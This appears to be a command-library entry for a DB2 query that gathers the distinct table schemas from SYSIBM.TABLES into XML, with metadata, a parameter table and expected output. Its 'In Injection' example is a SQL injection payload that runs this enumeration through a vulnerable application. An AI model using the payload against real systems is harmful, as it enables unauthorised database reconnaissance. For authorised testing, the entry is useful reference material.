---
id: 9525b6c8-9c37-4d17-89b9-c49350c95a7c
name: DB2-Select-XMLAgg-XMLRow-Distinct-Table-Schema-From-SysIBM-Tables
type: command
executor: sql
data: >-
  select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from
  sysibm.tables)
output: null
created_at: '2023-04-06T03:56:33.116167+00:00'
updated_at: '2023-04-10T20:22:05.851680+00:00'
platforms:
  - Linux
  - Windows
  - Cloud
tags:
  - db2
  - enumeration
  - xml
verified: true
validated: true
---

# DB2-Select-XMLAgg-XMLRow-Distinct-Table-Schema-From-SysIBM-Tables

## Command

```sql
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)
```

## Description

This SQL command retrieves unique table schemas from DB2's SYSIBM.TABLES, aggregating them into XML without duplicates via a DISTINCT subquery. Ideal for cleaner enumeration in large databases.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| distinct(table_schema) | Ensures unique schemas in subquery | Built-in |
| xmlagg | Aggregates unique XML rows | Built-in |
| xmlrow(table_schema) | Converts schema to XML row | Built-in |
| sysibm.tables | System view for table metadata | Built-in |

## Examples

### Basic Usage

```sql
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)
```

### In Injection

`'; select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) --`

## Expected Output

XML string with unique schemas:

```xml
<row><table_schema>UNIQUE_SCHEMA1</table_schema></row><row><table_schema>UNIQUE_SCHEMA2</table_schema></row>...
```

## Related

- [[procedures/DB2-Schema-Enumeration-via-XML-Serialization]]
- [[commands/DB2-Select-XMLAgg-XMLRow-Table-Schema-From-SysIBM-Tables]]
